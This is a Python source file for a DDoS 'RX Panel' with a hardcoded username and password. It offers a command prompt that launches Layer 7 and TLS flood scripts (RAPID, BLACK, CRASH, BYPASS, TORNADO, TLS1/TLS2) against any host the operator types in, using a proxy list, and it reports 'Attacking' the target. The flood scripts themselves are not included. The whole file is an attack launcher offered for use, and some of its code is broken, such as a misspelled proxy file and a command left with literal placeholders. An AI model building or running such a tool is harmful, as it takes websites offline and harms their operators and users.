import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxy.txt').readlines()
bots = len(proxys)
bots_str = str(bots)

def si():
    # Placeholder for si() function body
    pass  # You can add a body later or keep this to avoid the IndentationError

def neofetch():
    os.system("neofetch --ascii_colors 4 6 2 5 1 3 --ascii_distro Linux")

def atas():
    print('| \x1b[38;2;0;255;0mWelcome To \x1b[38;2;255;255;255mRX Panel\x1b[38;2;0;255;0m | ')
    
print(' Type  l7 for methods ')
print("")
    
def logo():
    clear()
    neofetch()
    atas()
    si()
    print("""
_    ____  __  ___   _
   / \\  |  _ \\ \\ \\/ / | | |
  / _ \\ | |_) | \\  /| | | |
 / ___ \\|  _ <  /  \\| |_| |
/_/   \\_\\_| \\_\\/_/\\_\\\\___/
 """)

def methods():
    print(''''
 \x1b[38;2;0;255;0mLayer7:\x1b[38;2;255;255;255m
        
        
\x1b[38;2;0;255;0mBLACK\x1b[38;2;255;255;255m
<Target> <Time> <Threads>

\x1b[38;2;0;255;0mRAPID\x1b[38;2;255;255;255m 
<target> <Time> <Rate> <Threads>

\x1b[38;2;0;255;0mCRASH\x1b[38;2;255;255;255m 
 {host} 9999 get {time}      
 
\x1b[38;2;0;255;0mHTTPS\x1b[38;2;255;255;255m 
 <Method> <URL> <TIME> 
 
 \x1b[38;2;0;255;0mBYPASS\x1b[38;2;255;255;255m 
<host> <time> 100 10 proxy.txt
   
\x1b[38;2;0;255;0mTORNADO\x1b[38;2;255;255;255m   
<host> <GET/POST> <target> <time> <threads> <ratelimit> <proxy> 
         \x1b[38;2;0;255;0mTLS1\x1b[38;2;255;255;255m <Target> <Time> <Rate> <threads>
         
        \x1b[38;2;0;255;0mTLS2\x1b[38;2;255;255;255m <Target> <Time> <Rate> <threads>
''')

def main():
    logo()
    while True:
        cnc = input('''\x1b[38;2;255;255;255mroot@RX-panel\n =>\x1b[38;2;255;255;255m''')
        if cnc == "Methods" or cnc == "METHODS" or cnc == "methods" or cnc == "l7":
   
            methods()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "Clear":
            main()

        # LAYER 7 METHODS
        
        elif "RAPID" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node RAPID.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BLACK" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BLACK.js {host} {time} 100 10')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');             
                
        elif "CRASH" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'go run CRASH.go {host} 9999 get {time} nil')

            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "HTTPS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node HTTPS.js {host} {time} 100 10 proxy.tx')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node BYPASS.js {host} {time} 100 10 proxy.txt')
            except IndexError:
                print('Usage: METHOD URL TIME');
                print('Example: METHOD URL TIME');
                
        elif "TORNADO" in cnc:
            try: 
                host = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                print("Attacking " + host + " For " + time + " ")
                os.system(f'node TORNADO.js <GET/POST> <target> <time> <threads> <ratelimit> <proxy>')
            except IndexError:
                print('Usage: METHOD URL TIME Threads RateLiMIT Proxy.txt');
                print('Example: METHOD URL TIME');

        elif "TLS1" in cnc:
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                proxyFile = cnc.split()[5]
                os.system(f'node TLS3.js {target} {time} {Rate} {threads} proxy.txt')
            except IndexError:
                print('Usage: TLS3 <Target> <Time> <Rate> <threads> ')
                print('Example: TLS3 https://example.com 120 512 1000')
                print(' Tls-Sky ')

        elif "TLS2" in cnc: 
            try:
                target = cnc.split()[1]
                time = cnc.split()[2]
                Rate = cnc.split()[3]
                threads = cnc.split()[4]
                os.system(f'node TLS4.js {target} {time} {Rate} {threads}')
            except IndexError:
                print('Usage: TLS4 <Target> <Time> <Rate> <threads>')
                print('Example: TLS4  https://example.com 120 512 1000')
                print(' Tls Load ')

        # Except IndexError
        elif "Help" in cnc:
            print(f'''
» Methods : To show methods
» Clear: To clear all messages
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass

# LOG-IN
def login():
    clear()
    neofetch()
    print("\n\x1b[38;2;255;255;255m-------------------------------------------\x1b[0m")
    print("\x1b[38;2;0;255;0m            Welcome to ĀRXŪ Panel!!!...\x1b[0m")
    print("\x1b[38;2;255;255;255m-------------------------------------------\x1b[0m")

    user = "rx"
    passwd = "vvip"
    username = input("\n\x1b[38;2;255;255;255mUsername: \x1b[0m")
    password = getpass.getpass(prompt='\x1b[38;2;255;255;255mPassword: \x1b[0m')
    
    if username != user or password != passwd:
        print("\n\x1b[38;2;255;0;0mSorry, the password you entered is wrong!!!\x1b[0m")
        sys.exit(1)
    elif username == user and password == passwd:
        time.sleep(0.3)
        main()

login()